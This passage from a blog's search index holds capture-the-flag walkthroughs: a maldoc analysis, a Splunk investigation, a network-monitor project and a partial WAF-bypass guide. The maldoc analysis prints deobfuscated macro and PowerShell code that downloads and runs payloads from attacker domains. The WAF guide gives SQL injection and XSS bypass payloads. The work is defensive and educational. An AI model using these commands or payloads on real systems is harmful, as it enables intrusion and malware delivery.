ElasticsearchTo analyze process creation logs:$ curl -d \"$(cat query.json)\" -H 'Content-Type: application/json' -s http://elastic:elastic@&lt;ELASTIC_IP&gt;:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size=10000 | jq -r '.hits.hits[].\"_source\".user.name' | sort | uniq -c | sort -nrEndpoint ActivityEndpoints with the most activity:5695 WKSTN-00512174 DC012131 WKSTN-1327"
  },
  
  {
    "title": "THM: Squid Game",
    "url": "/posts/ctf-blueteam-squid-game",
    "categories": "CTF, Blue Team",
    "tags": "CTF, Blue Team",
    "date": "2025-01-21 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: HardTools Used:  olemeta  oletimes  oleid  oledump.py  vipermonkeyResources Used::  Squid Game: TryHackMeSteps for the CTFAttacker 1Document Metadata Analys...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: HardTools Used:  olemeta  oletimes  oleid  oledump.py  vipermonkeyResources Used::  Squid Game: TryHackMeSteps for the CTFAttacker 1Document Metadata AnalysisWe start by analyzing the metadata of the malicious document (attacker1.doc) using olemeta and oletimes. This provides valuable information such as the document title, author, and timestamps that can assist in attribution and threat hunting. However, keep in mind that metadata can be spoofed, so it should not be taken at face value.parrot@parrot:~$ olemeta attacker1.docFILE: attacker1.docProperties from the SummaryInformation stream:+---------------------+------------------------------+|Property             |Value                         |+---------------------+------------------------------+|codepage             |1251                          ||title                |Networked multi-state         ||                     |projection                    ||subject              |West Virginia  Samanta        |...snip...Observations:  Q6: Find the phone number in the maldoc. (Answer based on metadata extraction.)  Q8: Provide the subject for this maldoc: West Virginia Samanta.  Q9: Provide the time when this document was last saved. (Cross-reference between olemeta and oletimes outputs. Note the 30-second discrepancy.)Macros AnalysisNext, we confirm the presence of macros and assess their potential maliciousness using oleid. The tool identifies suspicious keywords and confirms the presence of VBA macros.parrot@parrot:~$ oleid attacker1.doc Filename: attacker1.doc...snip...--------------------+--------------------+----------+--------------------------VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA                        |                    |          |macros. Suspicious                            |                    |          |keywords were found. Use                      |                    |          |olevba and mraptor for                        |                    |          |more info.                --------------------+--------------------+----------+--------------------------...snip...To locate the macros within the document, we use oledump.py, which identifies streams containing macros (marked with an “M”).parrot@parrot:~$ oledump.py attacker1.doc ...snip...  7:        41 'Macros/PROJECTwm'  8: M    9852 'Macros/VBA/ThisDocument'  9:      5460 'Macros/VBA/_VBA_PROJECT'...snip...Observations:  Q7: Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”: AutoExec.  Q10: Provide the stream number that contains a macro: 8.  Q11: Provide the name of the stream that contains a macro: Macros/VBA/ThisDocument.Deobfuscation Using ViperMonkeyThe extracted macro code is heavily obfuscated. To simplify analysis, we use vipermonkey to emulate the macro’s execution and deobfuscate its logic.parrot@parrot:~$ vmonkey -s attacker1.docAfter deobfuscation, the macro’s core functionality becomes clearer:Sub AutoOpen()On Error Resume Next  Set shapeHandle = Shapes(\"h9mkae7\")  VBA.Shell# \"CmD /C \" Replace(shapeHandle.AlternativeText + \"\", \"[\", \"A\") , 0End SubExplanation:The macro retrieves the AlternativeText property of a Shape object named “h9mkae7” and replaces all instances of “[” with “A”. The resulting string is passed to cmd.exe via VBA.Shell.Using oledump.py with an ad-hoc YARA rule, we extract the command stored in the Shape object’s alt text:parrot@parrot:~$ oledump.py -y \"#s#h9mkae7\" attacker1_2.doc   1:       114 '\\x01CompObj'  2:      4096 '\\x05DocumentSummaryInformation'  3:      4096 '\\x05SummaryInformation'  4:     13859 '1Table'               YARA rule: string...snip...Extracting strings from stream 4 reveals the encoded PowerShell command:parrot@parrot:~$ oledump.py -s 4 -S attacker1_2.doch9mkae7P^O^W^E^R^S^H^E^L^L ^-^N^o^P^r^o^f^i^l^e^ -^E^x^e^cutionPolicy B^^^yp^ass -encodedcommand J[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[......snip...Code AnalysisThe decoded PowerShell script performs the following actions:      WebClient Creation:Creates an instance of WebClient to make HTTP requests.        C2 Communication:Downloads additional payloads from attacker-controlled domains and IPs.        Executable Dropping:Saves a downloaded executable to C:\\ProgramData\\QdZGP.exe.        Execution via COM Object:Executes the dropped executable using the ShellBrowserWindow COM object.  Observations:  Q1: What is the malicious C2 domain you found in the maldoc where an executable download was attempted? (Answer based on analysis.)  Q2: What executable file is the maldoc trying to drop? QdZGP.exe.  Q3: In what folder is it dropping the malicious executable? C:\\ProgramData.  Q4: Provide the name of the COM object the maldoc is trying to access. ShellBrowserWindow.  Q5: Include the malicious IP and the PHP extension found in the maldoc. (Answer based on analysis.)Attacker 2Identifying MacrosWe begin by analyzing the malicious document (attacker2.doc) using oleid, olevba, and oledump. These tools help us identify and assess the macros embedded within the document.parrot@parrot:~$ oleid attacker2.doc...snip...Filename: attacker2.doc--------------------+--------------------+----------+--------------------------Indicator           |Value               |Risk      |Description               --------------------+--------------------+----------+--------------------------...snip...VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA                        |                    |          |macros. Suspicious                            |                    |          |keywords were found. Use                      |                    |          |olevba and mraptor for                        |                    |          |more info.                --------------------+--------------------+----------+--------------------------Using olevba, we extract additional details about the potentially malicious activities performed by the macros:parrot@parrot:~$ olevba attacker2.doc...snip...+----------+--------------------+---------------------------------------------+|Type      |Keyword             |Description                                  |+----------+--------------------+---------------------------------------------+|AutoExec  |AutoOpen            |Runs when the Word document is opened        ||AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |          |                    |objects trigger events                       ||Suspicious|Open                |May open a file                              ||Suspicious|Output              |May write to a file (if combined with Open)  ||Suspicious|Print #             |May write to a file (if combined with Open)  ||Suspicious|Binary              |May read or write a binary file (if combined ||          |                    |with Open)                                   ||Suspicious|Shell               |May run an executable file or a system       |          |                    |command                                      ||Suspicious|wscript.shell       |May run an executable file or a system       |          |                    |command                                      |...snip...To locate the streams containing macros, we use oledump.py:parrot@parrot:~$ oledump.py attacker2.doc ...snip...  9:      2220 'Macros/Form/o' 10:       566 'Macros/PROJECT' 11:        92 'Macros/PROJECTwm' 12: M    6655 'Macros/VBA/Form' 13: M   15671 'Macros/VBA/Module1' 14: M    1593 'Macros/VBA/ThisDocument' 15:     42465 'Macros/VBA/_VBA_PROJECT' 16: M    2724 'Macros/VBA/bxh'...snip...Observations:  Q1: Provide the streams (numbers) that contain macros: 12, 13, 14, 16.  Q2: Provide the size (bytes) of the compiled code for the second stream that contains a macro: 15671.  Q3: Provide the largest number of bytes found while analyzing the streams: 42465.  Q12: Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream): Macros/Form/o.Initial Macro AnalysisWe export the discovered macros using oledump.py with the -s flag. Streams 12 and 13 contain long, seemingly legitimate functions for validating email addresses and handling MP3 files, which may serve as distractions for analysts. Stream 14 contains the entry point with the AutoOpen() subroutine, which calls bxh.eFile.parrot@parrot:~$ oledump.py -s 14 -v attacker2.docSub AutoOpen()    bxh.eFileEnd SubThe eFile subroutine is located in stream 16:Attribute VB_Name = \"bxh\"Sub eFile()    Dim QQ1 As Object    Set QQ1 = New Form    RO = StrReverse(\"\\ataDmargorP\\:C\")    ROI = RO + StrReverse(\"sbv.nip\")    ii = StrReverse(\"\")    Ne = StrReverse(\"IZOIZIMIZI\")    WW = QQ1.t2.Caption    MyFile = FreeFile    Open ROI For Output As #MyFile    Print #MyFile, WW    Close #MyFile    fun = Shell(StrReverse(\"sbv.nip\\ataDmargorP\\:C exe.tpircsc k/ dmc\"), Chr(48))    EndEnd SubAfter deobfuscation, the macro’s functionality becomes clearer:Sub eFile()    Dim formHandle As Object    Set formHandle = New Form    directory = \"C:\\ProgramData\\\"    fileLocation = directory + \"pin.vbs\"    formCaption = formHandle.t2.Caption    MyFile = FreeFile    Open fileLocation For Output As #MyFile    Print #MyFile, formCaption    Close #MyFile    fun = Shell(\"cmd /k cscript.exe C:\\ProgramData\\pin.vbs\", 0)    EndEnd SubThe macro extracts the Caption text from a form object named “t2” and writes it to C:\\ProgramData\\pin.vbs. It then uses cmd.exe to execute the script via cscript.exe.Observations:  Q4: Find the command located in the ‘fun’ field: cmd /k cscript.exe C:\\ProgramData\\pin.vbs.Code AnalysisThe extracted Visual Basic script (pin.vbs) performs the following actions:      Initial Delay:The script waits for 4 seconds before proceeding. The purpose of this delay is unclear, as no prior actions are required to complete.    WAITPLZ = DateAdd('s', 4, Now())Do Until (Now() &gt; WAITPLZ)Loop            Downloading DLLs:The script defines five obfuscated PowerShell commands (LL1 through LL5) that download .dll files from attacker-controlled domains and save them to C:\\ProgramData.    $FOOX = '(New-Object Net.WebClient).DownloadFile(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\\ProgramData\\www1.dll'')';IEX $FOOX | IEX;            Executing DLLs:The script creates a WScript.Shell object to execute the downloaded .dll files using rundll32.exe.    Set Shell = CreateObject(\"wscript.shell\")Shell.Run \"powershell\" + LL1, 0Shell.Run \"powershell\" + LL2, 0        After ensuring all downloads are complete, the script executes the .dll files:    OK1 = \"cmd /c rundll32.exe C:\\ProgramData\\www1.dll,ldr\"Ran.Run OK1, 0OK2 = \"cmd /c rundll32.exe C:\\ProgramData\\www2.dll,ldr\"Ran.Run OK2, 0      Observations:  Q5: Provide the first domain found in the maldoc: priyacareers.com.  Q6: Provide the second domain found in the maldoc: (Answer based on analysis.)  Q7: Provide the name of the first malicious DLL it retrieves from the C2 server: www1.dll.  Q8: How many DLLs does the maldoc retrieve from the domains? 5.  Q9: Provide the path of where the malicious DLLs are getting dropped onto: C:\\ProgramData.  Q10: What program is it using to run DLLs? rundll32.exe.  Q11: How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs? 4.Attacker 3Identifying MacrosFollowing the patterns observed in Attacker 1 and Attacker 2, we can assume that attacker3.doc is a .doc file containing malicious VBA macros. Running oleid confirms the presence of suspicious VBA macros:parrot@parrot:~$ oleid attacker3.doc ...snip...--------------------+--------------------+----------+--------------------------VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA                        |                    |          |macros. Suspicious                            |                    |          |keywords were found. Use                      |                    |          |olevba and mraptor for                        |                    |          |more info.                ...snip...Using oledump.py, we identify the streams containing macros (marked with “M”):parrot@parrot:~$ oledump.py attacker3.doc A: word/vbaProject.bin A1:       423 'PROJECT' A2:        53 'PROJECTwm' A3: M    2017 'VBA/T' A4: m    1127 'VBA/ThisDocument' A5:      2976 'VBA/_VBA_PROJECT' A6:      1864 'VBA/__SRP_0' A7:       190 'VBA/__SRP_1' A8:       348 'VBA/__SRP_2' A9:       106 'VBA/__SRP_3'A10: M    1291 'VBA/d'A11:       723 'VBA/dir'Observations:Streams A3, A4, and A10 contain likely malicious code. Stream A4 defines generic variables, while A3 and A10 contain the core malicious logic. Since the autoopen() subroutine is located in A3, we begin our analysis there.Manual Analysis of Stream A3Stream A3 contains the following VBA code:Sub autoopen()    LG = h(\"12%2%...snip...%77\")    Dim XN As New WshShell    Call XN.run(\"cmd /c set u=tutil&amp;&amp;call copy C:\\Windows\\System32\\cer%u%.exe C:\\ProgramData\\1.exe\", 0)    Call XN.run(LG, 0)End SubAfter cleaning up the code manually, we get a clearer understanding of its functionality:Sub autoopen()    decoded_command = decodeFunction(\"LONG-ENCODED-STRING\")    Dim shellInstance as New WshShell    Call shellInstance.run(\"cmd /c copy C:\\Windows\\System32\\certutil.exe C:\\ProgramData\\1.exe\", 0)    Call shellInstance.run(decoded_command, 0)End SubStep-by-Step Breakdown:      Decoding the Command:The macro passes an encoded string to the function h, which decodes it. We will analyze the decoding logic later in Stream A10.        Creating a Shell Instance:A new WshShell instance is created to execute commands on the host.        Copying Certutil:The macro uses cmd.exe to copy C:\\Windows\\System32\\certutil.exe to C:\\ProgramData\\1.exe. Certutil is a legitimate Windows utility commonly abused by malware for making HTTP requests.        Executing the Decoded Command:The decoded command is executed using the same WshShell instance. The 0 at the end of the Shell.run call hides the terminal window, reducing the likelihood of detection.  Manual Analysis of Stream A10Stream A10 contains the decoding function h and another unused function vY:Function h(ju)    eR = Split(ju, \"%\")    For lc = 0 To UBound(eR)        hh = hh &amp; Chr(eR(lc) Xor 111)        Next lc        h = hhEnd FunctionFunction vY()    vY = \"util\"End FunctionThe h function performs a basic XOR decryption. It splits the encoded string by %, XORs each character with the key 111, and concatenates the results. Implementing this logic in Python allows us to decode the command:CIPHER = \"12%2%11%79%64%12%79%77%28%10%...\"KEY = 111cipher_chars = CIPHER.split('%')plain = ''.join([chr(int(c) ^ KEY) for c in cipher_chars])print(plain)The decoded command is:cmd /c \"set u=url&amp;&amp;call C:\\ProgramData\\1.exe /%u%^c^a^c^h^e^ /f^ hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\\ProgramData\\1.tmp &amp;&amp; call regsvr32 C:\\ProgramData\\1.tmp\"After cleaning it up:cmd /c C:\\ProgramData\\1.exe /urlcache /f hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\\ProgramData\\1.tmp &amp;&amp; call regsvr32 C:\\ProgramData\\1.tmpExplanation:  The macro calls cmd.exe to execute the copied certutil.exe (C:\\ProgramData\\1.exe) with the /urlcache /f flags. This makes certutil download a file from the attacker-controlled domain and save it as C:\\ProgramData\\1.tmp.  The downloaded file is then executed using regsvr32, another legitimate Windows utility commonly abused by malware.Observations  Q1: Provide the executable name being downloaded: 1.tmp.  Q2: What program is used to run the executable? regsvr32.  Q3: Provide the malicious URI included in the maldoc that was used to download the binary: hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab.  Q4: What folder does the binary get dropped in? C:\\ProgramData.  Q5: Which stream executes the binary that was downloaded? Stream A3.Attacker 4Identifying MacrosFollowing the patterns observed in previous attackers, we begin by confirming the presence of malicious VBA macros in attacker4.doc using oleid:parrot@parrot:~$ oleid attacker4.doc ...snip...--------------------+--------------------+----------+--------------------------VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA                        |                    |          |macros. Suspicious                            |                    |          |keywords were found. Use                      |                    |          |olevba and mraptor for                        |                    |          |more info.                ...snip...Using oledump.py, we identify the streams containing macros (marked with “M”):parrot@parrot:~$ oledump.py attacker4.doc ...snip...  6:        41 'Macros/PROJECTwm'  7: M   17216 'Macros/VBA/ThisDocument'  8:     10917 'Macros/VBA/_VBA_PROJECT'...snip...The macro code is extracted from stream 7:parrot@parrot:~$ oledump.py -s 7 -v attacker4.docThe result is 283 lines of heavily obfuscated VBA code. While vipermonkey can automate deobfuscation, we’ll manually analyze the code to better understand its functionality.Manual DeobfuscationThe obfuscated code employs four basic techniques to obscure its behavior:      One-liner If … Then End Statements:These contain impossible conditions (e.g., If 128918 = 128918 + 1 Then End).        Multi-line If … Then Statements:These also contain impossible conditions (e.g., If 3264 &lt; 68 Then).        GoTo Statements:These jump to a label on the very next line, effectively doing nothing (e.g., GoTo zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:).        Random Variable Names:Variables like Dim bOYvqTVCQck As String make the code harder to read.  The first step in manual deobfuscation is to remove all non-functional code, including impossible If statements and useless GoTo statements. After renaming variables based on their likely purpose, the 283-line script is reduced to 67 lines of cleaner code.Manual AnalysisThe cleaned-up code reveals the following logic:Entry Point:The AutoOpen() subroutine immediately calls the IOWZJGNTSGK function:Sub IOWZJGNTSGK()    gGHBkj = XORI(Hextostring(\"1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811\"), Hextostring(\"744F50\"))    ZUWSBYDOTWV gGHBkj, Environ(XORI(Hextostring(\"3E200501\"), Hextostring(\"6A654851714A64\"))) &amp; XORI(Hextostring(\"11371B0A00123918220E001668143516\"), Hextostring(\"4D734243414671\"))End SubAfter decoding the strings using the Hextostring and XORI functions, the code simplifies to:Sub IOWZJGNTSGK()    domain = \"hxxp://gv-roth.de/js/bin.exe\"    ZUWSBYDOTWV domain, Environ(\"TEMP\") &amp; \"\\DYIATHUQLCW.exe\"End SubExplanation:  The macro passes an attacker-controlled domain (hxxp://gv-roth.de/js/bin.exe) and a file location (%USER%\\AppData\\Local\\Temp\\DYIATHUQLCW.exe) to the ZUWSBYDOTWV function.  Environ(\"TEMP\") resolves to %USER%\\AppData\\Local\\Temp in Windows 10.Decoding StringsThe Hextostring and XORI functions are rewritten in Python for easier decoding:def hextostring(hx: str) -&gt; bytes:    hex_chars = [hx[i:i+2] for i in range(0, len(hx), 2)]    return b''.join([chr(int(hc, 16)).encode() for hc in hex_chars])def xor(cipher: bytes, key: bytes) -&gt; None:    return ''.join([chr(int(b) ^ int(key[i % len(key)])) for i,b in enumerate(cipher)])cipher = \"\"  # Add ciphertextkey = \"\"  # Add keyprint(xor(hextostring(cipher), hextostring(key)))Using this approach, the ZUWSBYDOTWV function is cleaned up further:Function ZUWSBYDOTWV(ByVal domain As String, ByVal executableFileLocation As String) As Boolean    Dim xmlHttpClient As Object, fileHandle As Long, responseBody() As Byte    Set xmlHttpClient = CreateObject(\"MSXML2.XMLHTTP\")    xmlHttpClient.Open \"GET\", domain, False    xmlHttpClient.Send \"gVHBnk\"    responseBody = xmlHttpClient.responseBody    fileHandle = FreeFile    Open executableFileLocation For Binary As #fileHandle    Put #fileHandle, , responseBody    Close #fileHandle    Set hBBkbmop6VHJL = CreateObject(\"Shell.Application\")    hBBkbmop6VHJL.Open Environ(\"TEMP\") &amp; \"\\DYIATHUQLCW.exe\"End FunctionStep-by-Step Breakdown:      HTTP Request:The macro initializes an XmlHttp client to send a GET request to the attacker-controlled domain (hxxp://gv-roth.de/js/bin.exe).        Saving the Response:The response body is written to a file at %USER%\\AppData\\Local\\Temp\\DYIATHUQLCW.exe.        Executing the File:The downloaded executable is executed using Shell.Application.Open.  Observations  Q1: What is the malicious C2 domain you found in the maldoc? hxxp://gv-roth.de/js/bin.exe.  Q2: What executable file is the maldoc trying to drop? DYIATHUQLCW.exe.  Q3: In what folder is it dropping the malicious executable? %USER%\\AppData\\Local\\Temp.  Q4: Provide the name of the COM object the maldoc is trying to access. Shell.Application.Attacker 5Question 1: What is the caption you found in the maldoc?We begin by identifying streams containing macros using oledump.py. To extract all strings from the document, we use the following command:parrot@parrot:~$ oledump.py attacker5.doc -s a -SThis outputs numerous strings. To narrow down the search, we filter for the term “caption” using grep:parrot@parrot:~$ oledump.py attacker5.doc -s a -S | grep -i captionThe filtered output will reveal the caption string.Question 2: What is the XOR decimal value found in the decoded-base64 script?To locate the base64-encoded script, we emulate the VBA macros using vipermonkey:parrot@parrot:~$ vmonkey attacker5.docvipermonkey identifies a base64-encoded string. We decode this string using CyberChef:  Add the Decode Base64 action.  Add the Remove Null Bytes action.If the output still contains obfuscated content, look for additional base64 encoding or compression. For example:  If the script contains a call to FromBase64String, copy the encoded string and decode it again in CyberChef.  If the script mentions New-Object IO.Compression.GzipStream, add the Gunzip action to decompress the data.Once fully decoded, search the output for the term “xor” to find the XOR decimal value.Question 3: Provide the C2 IP address of the Cobalt Strike serverAfter decoding the script in CyberChef, observe any remaining base64-encoded text. Copy this text into a new CyberChef window and:  Decode the base64 string.  Apply an XOR operation using the decimal value identified in Question 2.The resulting output will contain legible information, including the C2 IP address.Question 4: Provide the full user-agent foundThe user-agent string will be visible in the output obtained during the previous step. Simply copy the user-agent string from the decoded script.Question 5: Provide the path value for the Cobalt Strike shellcodeSave the decoded shellcode from CyberChef to a file (e.g., download.dat). Use scdbgc to analyze the shellcode:parrot@parrot:~$ scdbgc -f ~/Downloads/download.dat -s -1The output will include details about the shellcode’s behavior, including paths. Identify the relevant path values from the output.Question 6: Provide the port number of the Cobalt Strike C2 ServerIn the output generated by scdbgc, look for the port number associated with the C2 server’s IP address.Question 7: Provide the first two APIs foundExamine the scdbgc output for the first two API calls made by the shellcode. These will typically appear near the beginning of the execution trace."
  },
  
  {
    "title": "Network Monitor",
    "url": "/posts/python-network-monitor",
    "categories": "Python, Network Monitor",
    "tags": "Python, Network Monitor",
    "date": "2025-01-19 00:00:00 +0000",
    





    
    "snippet": "A Python-based desktop application to monitor and analyze real-time network traffic, system performance, and packet details.Network Monitor Repository  Link: Network Monitor RepositoryFeatures  Rea...",
    "content": "A Python-based desktop application to monitor and analyze real-time network traffic, system performance, and packet details.Network Monitor Repository  Link: Network Monitor RepositoryFeatures  Real-Time Packet Capture: Capture and analyze network packets as they flow through your system.  Packet Filtering: Filter packets by protocol (e.g., TCP, UDP) or IP address for focused analysis.  Location &amp; Service Detection: Automatically detect the location and service associated with destination IPs using an external API.  Data Export: Export captured data in CSV, JSON, or HTML formats for offline analysis.  System Monitoring: Track CPU, memory, disk, and network usage with warnings for high resource utilization.  Visualizations: View real-time bandwidth usage, protocol distribution, and system performance graphs.  Auto-Scroll: Automatically scroll through captured packets for continuous monitoring.  Dark/Light Theme: Toggle between light and dark themes for better usability.How It WorksThe Network-Monitor tool captures network packets using the scapy library and analyzes them in real-time. Each packet’s details, such as source/destination IPs, protocol, size, and encryption status, are extracted and displayed in a user-friendly interface. The tool also integrates with the ipapi.com API to fetch location and service information for destination IPs.Captured data is stored in an SQLite database for later retrieval and can be exported in multiple formats (CSV, JSON, HTML). System performance metrics like CPU and memory usage are monitored using the psutil library, and visualizations are created using matplotlib and plotly.Code StructureThe project is organized into modular components for clarity and maintainability:  modules/data_manager.py: Handles database operations and data exports.  modules/packet_analyzer.py: Analyzes captured packets and extracts details like protocol, size, and encryption status.  modules/system_monitor.py: Monitors system resources (CPU, memory, disk, network).  modules/visualizer.py: Creates visualizations for bandwidth usage, protocol distribution, and system performance.  main.py: The main application file that ties everything together and provides the GUI.This modular structure makes it easy to extend or modify specific functionalities without affecting the entire codebase.InterfaceFuture EnhancementsWe’re continuously working to improve the Network-Monitor tool. Here are some planned enhancements:  Advanced Filtering: Add more filtering options, such as port numbers and packet size ranges.  Enhanced Visualizations: Include heatmaps and more detailed graphs for deeper insights.  Cross-Platform Support: Ensure seamless operation on Windows, macOS, and Linux.  Customizable Alerts: Allow users to set custom thresholds for system resource warnings.  API Integration: Add support for additional APIs to enhance location and service detection.  Offline Mode: Provide offline functionality for environments without internet access."
  },
  
  {
    "title": "THM: Benign",
    "url": "/posts/ctf-blueteam-benign",
    "categories": "CTF, Blue Team",
    "tags": "CTF, Blue Team",
    "date": "2025-01-18 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Splunk  VirusTotal (for URL verification)Resources Used:  Benign: Tryhackme  Splunk Query Language (SPL)  Event ID 4688 logs  Knowledge o...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Splunk  VirusTotal (for URL verification)Resources Used:  Benign: Tryhackme  Splunk Query Language (SPL)  Event ID 4688 logs  Knowledge of Windows processes and LOLBinsSteps for the CTFOverviewIn this scenario, you only have access to process execution logs with Event ID: 4688 in Splunk. This means you won’t have access to all Sysmon logs, making the investigation more challenging.The network is divided into three logical segments:IT Department  James  Moin  KatrinaHR Department  Haroon  Chris  DianaMarketing Department  Bell  Amelia  DeepakWith these details in mind, let’s begin the investigation!Questions1. How many logs are ingested from the month of March, 2022?To answer this question, you need to filter the logs to only include events from March 2022. Use the following Splunk query:index=win_eventlogsSet the date range in Splunk to March 2022 (you can adjust this in the time picker). Count the total number of logs returned by the query.2. Imposter Alert: There seems to be an imposter account observed in the logs. What is the name of that user?To identify the imposter, create a table of unique usernames from the logs using the following query:index=win_eventlogs | stats count by UserNameCompare the results with the list of known employees provided in the overview. Look for any anomalies or usernames that don’t match the expected names.3. Which user from the HR department was observed to be running scheduled tasks?Focus on the HR department users (Haroon, Chris, Diana) and search for events related to schtasks.exe, the Windows process used for managing scheduled tasks. Use the following query:index=win_eventlogs AND (UserName=\"haroon\" OR UserName=\"Daina\" OR UserName=\"Chris.fort\") schtasksExamine the results to determine which user was running scheduled tasks.4. Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?To answer this question, create a table containing the UserName, ProcessName, and CommandLine fields for the HR department users. Use the following query:index=win_eventlogs AND (UserName=\"haroon\" OR UserName=\"Daina\" OR UserName=\"Chris.fort\")| table UserName ProcessName CommandLine| dedup UserName CommandLineLook for commands that involve downloading files from external sources. Pay attention to system processes like certutil.exe, which can be abused as a LOLBin (Living Off the Land Binary).5. To bypass the security controls, which system process (LOLBIN) was used to download a payload from the internet?Using the results from the previous question, identify the system process (LOLBin) that was used to download the payload. Look for commands in the CommandLine field that indicate file downloads.6. What was the date that this binary was executed by the infected host? Format (YYYY-MM-DD)From the results of the previous queries, locate the timestamp associated with the execution of the suspicious binary. Ensure the date is formatted as YYYY-MM-DD.7. Which third-party site was accessed to download the malicious payload?Examine the CommandLine field in the logs to identify the URL or domain used to download the payload. Focus on commands involving the identified LOLBin.8. What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?Inspect the CommandLine field in the logs to determine the name of the file that was downloaded and saved on the host machine. Look for parameters that specify the output filename.9. The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{……….}; what is that pattern?Once you’ve identified the URL where the payload was hosted, visit the link to view its contents. Before accessing the URL, verify its safety using tools like VirusTotal. The content of the file will contain the flag in the format THM{...}.10. What is the URL that the infected host connected to?From the results of your earlier queries, extract the URL or domain used to download the malicious payload. This URL will be visible in the CommandLine field."
  },
  
  {
    "title": "WAF Bypass: Techniques, Tools, and Tactics for Penetration Testers",
    "url": "/posts/waf-bypass",
    "categories": "Exploits, WAF Bypass",
    "tags": "Exploits, WAF Bypass, Web Application Security",
    "date": "2025-01-17 00:00:00 +0000",
    





    
    "snippet": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work...",
    "content": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work?  Famous WAF Services  The Importance of a WAF in Vulnerability Protection  Top 10 Ways to Bypass a WAF  Advanced WAF Bypass Techniques  Tools to Bypass WAFs  XSS Bypass Techniques and Payloads  Real-World Examples of WAF Bypasses  Best Practices for Defenders  ConclusionWhat is a Web Application Firewall (WAF)?A Web Application Firewall (WAF) is a security mechanism that monitors, filters, and blocks HTTP/HTTPS traffic to and from a web application. Its primary purpose is to protect web applications from common cyber threats like cross-site scripting (XSS), SQL injection (SQLi), file inclusion attacks, and other types of malicious payloads. WAFs analyze the data that flows between the internet and a web application, looking for patterns of attack and preventing potentially harmful traffic from reaching the application.Purpose of a WAFThe role of a WAF in a security strategy is critical because web applications are increasingly targeted by hackers. As more organizations move services online, they become prime targets for attackers looking to steal data, disrupt services, or gain unauthorized access to sensitive systems.A WAF provides several key functions:  Traffic Filtering: Inspects incoming HTTP requests and blocks malicious traffic based on predefined rules.  Attack Prevention: Actively mitigates the risk of common web vulnerabilities, including XSS, SQL injection, remote file inclusion (RFI), and others.  Access Control: Restricts access to certain parts of a web application, ensuring only authorized users can access sensitive data.  DDoS Mitigation: Some WAFs provide built-in protection against distributed denial of service (DDoS) attacks.How Does a WAF Work?WAFs typically operate at the application layer (Layer 7) of the OSI model, monitoring HTTP/HTTPS requests. They are placed in front of a web application to inspect traffic before it reaches the application server. WAFs rely on various detection mechanisms, including:  Signature-based Detection: Compares traffic against known attack patterns.  Behavioral Analysis: Identifies abnormal behavior that deviates from the norm.  Rule-based Detection: Administrators can define custom rules for specific attack patterns.Famous WAF ServicesSeveral companies offer Web Application Firewall services, some of the most notable include:  AWS Web Application Firewall (AWS WAF)  Cloudflare WAF  Imperva WAF  F5 Advanced WAF  Azure Web Application FirewallThe Importance of a WAF in Vulnerability ProtectionA properly configured WAF plays a vital role in securing applications. However, it’s important to understand that WAFs are not foolproof. Despite their ability to block many common attacks, they can often be bypassed by skilled attackers. For cybersecurity professionals, particularly penetration testers and red teams, understanding how WAFs function and the weaknesses in their detection systems is key to finding vulnerabilities.Top 10 Ways to Bypass a WAF  Payload Encoding and Obfuscation          Techniques: Hex encoding, Base64 encoding, URL encoding.      Example: %53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73%20%57%48%45%52%45%20%69%64%20%3D%201;        HTTP Parameter Pollution          Example: GET /login?username=admin&amp;password=admin123&amp;password=malicious_payload        Case Transformation          Example: SeLeCt * FrOm users WhErE username = 'admin';        IP Fragmentation          Example: Splitting payloads into multiple IP packets.        JSON and XML Payloads          Example: Injecting malicious code into JSON/XML formats.        Session Awareness Bypassing          Example: Spreading attacks across multiple requests.        404 Bypassing          Example: Targeting non-existent pages to reduce WAF scrutiny.        DNS-Based Attacks          Example: Sending requests directly to the server’s IP address.        Rate Limiting Bypass          Example: Distributing requests across a botnet.        Exploiting Zero-Day Vulnerabilities          Example: Using unpatched flaws in software.      Advanced WAF Bypass Techniques1. Polyglot Payloads  Polyglot payloads are designed to work in multiple contexts (e.g., HTML, JavaScript, SQL).  Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/2. Time-Based Attacks  Exploiting time delays in WAF processing to bypass detection.  Example: Using SLEEP() in SQL injection payloads.3. Content-Type Manipulation  Changing the Content-Type header to confuse the WAF.  Example: Sending a JSON payload with Content-Type: text/plain.4. Chunked Encoding  Splitting payloads into chunks to evade detection.  Example: Using Transfer-Encoding: chunked in HTTP requests.Tools to Bypass WAFsHere are some popular tools used to bypass WAFs:  SQLMap          Features: Payload encoding, tamper scripts.      Command: python sqlmap.py -u \"&lt;http://target.com/page.php?id=1&gt;\" 